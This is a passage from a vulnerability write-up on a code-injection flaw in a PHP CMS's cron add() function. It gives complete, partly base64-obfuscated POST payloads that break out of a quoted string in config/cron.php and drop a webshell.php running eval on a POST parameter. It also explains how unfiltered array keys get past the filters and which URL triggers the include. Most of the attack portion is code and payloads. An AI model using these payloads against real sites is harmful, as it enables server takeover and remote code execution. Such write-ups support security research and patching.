</span></span></code></pre></td></tr></table>
</div>
</div><p>After URL decoding, it is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">isform=1&amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f&amp;data[1][name]=&amp;data[1][code]=[&#39;;file_put_contents(&#39;webshell.php&#39;,htmlspecialchars_decode(&#39;&amp;lt;&#39;).&#39;?php eval&#39;.base64_decode(&#39;KA==&#39;).&#39;@$_POST[&#39;.base64_decode(&#39;Ig==&#39;).&#39;password&#39;.base64_decode(&#39;Ig==&#39;).&#39;]&#39;.base64_decode(&#39;KQ==&#39;).&#39;;?&#39;.htmlspecialchars_decode(&#39;&amp;gt;&#39;));return;&#39;]
</span></span></code></pre></td></tr></table>
</div>
</div><p>After bypassing JSON encoding and &ldquo;XSS cleaning&rdquo;, the contents written in <code>WRITEPATH.'config/cron.php'</code> file are:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;FCPATH&#39;</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;No direct script access allowed&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="nv">$json</span><span class="o">=</span><span class="s1">&#39;{&#34;1&#34;:{&#34;name&#34;:&#34;&#34;,&#34;code&#34;:&#34;[&#39;</span><span class="p">;</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;webshell.php&#39;</span><span class="p">,</span><span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="s1">&#39;&amp;lt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;?php eval&#39;</span><span class="o">.</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;KA==&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;@$_POST[&#39;</span><span class="o">.</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;Ig==&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;password&#39;</span><span class="o">.</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;Ig==&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="o">.</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;KQ==&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;;?&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">));</span><span class="k">return</span><span class="p">;</span><span class="s1">&#39;]&#34;}}&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The key points in this post content are</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[&#39;;file_put_contents(&#39;webshell.php&#39;,htmlspecialchars_decode(&#39;&amp;lt;&#39;).&#39;?php eval&#39;.base64_decode(&#39;KA==&#39;).&#39;@$_POST[&#39;.base64_decode(&#39;Ig==&#39;).&#39;password&#39;.base64_decode(&#39;Ig==&#39;).&#39;]&#39;.base64_decode(&#39;KQ==&#39;).&#39;;?&#39;.htmlspecialchars_decode(&#39;&amp;gt;&#39;));return;&#39;]
</span></span></code></pre></td></tr></table>
</div>
</div><p>After bypassing JSON encoding and &ldquo;XSS cleaning&rdquo;, the content here becomes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[&#39;;file_put_contents(&#39;webshell.php&#39;,htmlspecialchars_decode(&#39;&amp;lt;&#39;).&#39;?php eval&#39;.base64_decode(&#39;KA==&#39;).&#39;@$_POST[&#39;.base64_decode(&#39;Ig==&#39;).&#39;password&#39;.base64_decode(&#39;Ig==&#39;).&#39;]&#39;.base64_decode(&#39;KQ==&#39;).&#39;;?&#39;.htmlspecialchars_decode(&#39;&gt;&#39;));return;&#39;]
</span></span></code></pre></td></tr></table>
</div>
</div><p>The package of <code>'</code> in document <code>WRITEPATH.'config/cron.php'</code> is closed</p>
<h4 id="include-the-writepathconfigcronphp-file-written-to">include the <code>WRITEPATH.'config/cron.php'</code> file written to
</h4><p>Through the analysis of add() function, when you call the add() function, you will first include the <code>WRITEPATH.'config/cron.php'</code> file when it exists, therefore, you can access <code>http://host:port/Admin.php?c=Cron&amp;m=add</code> directly</p>
<p>After accessing <code>http://host:port/Admin.php?c=Cron&amp;m=add</code>, <code>http://host:port/Admin.php?c=Cron&amp;m=add</code> file named webshell.php will be generated in the root directory of the website, and the content of the file is <code>&lt;?php eval(@$_POST[&quot;password&quot;]);?&gt;</code></p>
<h3 id="version-v451">version v4.5.1
</h3><p>code of add() function:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// ‰ªªÂä°Á±ªÂûã
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">add</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$json</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">require</span> <span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_AJAX_POST</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$post</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$post</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$post</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$t</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">unset</span><span class="p">(</span><span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dr_safe_filename</span><span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dr_safe_filename</span><span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$post</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&lt;?php defined(\&#39;FCPATH\&#39;) OR exit(\&#39;No direct script access allowed\&#39;);&#39;</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="s1">&#39; $json=\&#39;&#39;</span><span class="o">.</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">system_log</span><span class="p">(</span><span class="s1">&#39;ËÆæÁΩÆËá™ÂÆö‰πâ‰ªªÂä°Á±ªÂûã&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">dr_lang</span><span class="p">(</span><span class="s1">&#39;Êìç‰ΩúÊàêÂäü&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;data&#39;</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">&#39;cron_add.html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Compared with previous versions, version v4.5.1 modified the following code when obtaining the content of post:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>change to</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The second parameter of the post() function is whether to &ldquo;XSS clean&rdquo;. Since the default value of the second parameter of the post() function is <code>true</code>, this change will not have any impact in theory</p>
<p>At the same time, after obtaining the content of post and before writing <code>WRITEPATH.'config/cron.php'</code> file, the following code is added:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$post</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$post</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$post</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$t</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">unset</span><span class="p">(</span><span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dr_safe_filename</span><span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dr_safe_filename</span><span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$post</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above code first determines whether the content of post exists and is an array. If it does not meet the requirements, it will set the content of post as an empty array. If it meets the requirements, it will traverse the content of post. If the value of a key value pair does not exist or the value of <code>'name'</code> key of value of a key value pair does not exist, it will destroy the key value pair, and then clean the <code>'name'</code> key and <code>'code'</code> key of value of each key value pair through the dr_safe_filename() function, the following is the code of the dr_safe_filename() function:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * ÂÆâÂÖ®ËøáÊª§Êñá‰ª∂ÂèäÁõÆÂΩïÂêçÁß∞ÂáΩÊï∞
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">dr_safe_filename</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="s1">&#39;..&#39;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$string</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="bypass-the-json-encoding-xss-cleaning-dr_safe_filename-function-filtering-and-packages-in-writepathconfigcronphp-file">bypass the JSON encoding, &ldquo;XSS cleaning&rdquo;, dr_safe_filename() function filtering and packages in <code>WRITEPATH.'config/cron.php'</code> file
</h4><p>Instead of trying to bypass the dr_safe_filename() function, let&rsquo;s try another extremely simple method</p>
<p>Through the audit of the &ldquo;XSS cleaning&rdquo; function and the newly added code of the v5add() function, we can find that there is no filter for the key of the array, including the key of each dimension of the multidimensional array. Therefore, we can modify the key in the content of post to write any content we want</p>
<p>The following is my method. In the whole process of vulnerability exploitation, except for the above-mentioned filtering of value of key value pairs added in the add() function, other processes have no change compared with the previous version:</p>
<p>After obtaining csrf_test_name, give <code>http://host:port/Admin.php?c=Cron&amp;m=add</code> post the following contents:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">isform=1&amp;csrf_test_name=9f3342fbce7b49c85f05776bf89db778&amp;data%5B1%5D%5Bname%5D=1&amp;data%5B1%5D%5Bcode&#34;:&#34;1&#34;}}&#39;;eval(base64_decode(&#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&#39;));return;&#39;%5D=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>After url decoding, it is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">isform=1&amp;csrf_test_name=9f3342fbce7b49c85f05776bf89db778&amp;data[1][name]=1&amp;data[1][code&#34;:&#34;1&#34;}}&#39;;eval(base64_decode(&#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&#39;));return;&#39;]=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>After bypassing the filtering of JSON encoding, &ldquo;XSS cleaning&rdquo; and dr_safe_filename() function, the contents written in <code>WRITEPATH.'config/cron.php'</code> file are:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;FCPATH&#39;</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;No direct script access allowed&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="nv">$json</span><span class="o">=</span><span class="s1">&#39;{&#34;1&#34;:{&#34;name&#34;:&#34;1&#34;,&#34;code\&#34;:\&#34;1\&#34;}}&#39;</span><span class="p">;</span><span class="k">eval</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw\/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&#39;</span><span class="p">));</span><span class="k">return</span><span class="p">;</span><span class="s1">&#39;&#34;:&#34;1&#34;,&#34;code&#34;:&#34;&#34;}}&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The key points in this post content are</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;:&#34;1&#34;}}&#39;;eval(base64_decode(&#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&#39;));return;&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>After bypassing the filtering of JSON encoding, &ldquo;XSS cleaning&rdquo; and dr_safe_filename() function, the content here becomes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\&#34;:\&#34;1\&#34;}}&#39;;eval(base64_decode(&#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw\/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&#39;));return;&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>The package of <code>'</code> in document <code>WRITEPATH.'config/cron.php'</code> is closed</p>
<h4 id="include-the-writepathconfigcronphp-file-written-to-1">include the <code>WRITEPATH.'config/cron.php'</code> file written to
</h4><p>Through the analysis of the add() function in front, when calling the add() function, the <code>WRITEPATH.'config/cron.php'</code> file will be included when the <code>WRITEPATH.'config/cron.php'</code> file exists, so you can directly access <code>http://host:port/Admin.php?c=Cron&amp;m=add</code></p>
<p>After accessing <code>http://host:port/Admin.php?c=Cron&amp;m=add</code>, <code>http://host:port/Admin.php?c=Cron&amp;m=add</code> file named webshell.php will be generated in the root directory of the website, and the content of the file is <code>&lt;?php eval(@$_POST[&quot;password&quot;]);?&gt;</code></p>
<h3 id="after-version-v451">after version v4.5.1
</h3><p>The add() function is deleted</p>
<h2 id="poc--exp">POC &amp;&amp; EXP
</h2><p>It&rsquo;s very simple. I won&rsquo;t write it, but note that there may be holes in the CMS of the target site. For example, the version number is low but the actual site file has been updated</p>
<h3 id="poc">POC
</h3><p>Log in to the background, get the version number, and then verify whether it is an administrator or has the management permission of &ldquo;Â∫îÁî®&rdquo;-&gt;&ldquo;‰ªªÂä°ÈòüÂàó&rdquo;</p>
<h3 id="exp">EXP
</h3><p>Log in to the background, then post write malicious code, and finally get access to malicious files</p>
<h2 id="xss_clean-function">xss_clean() function
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
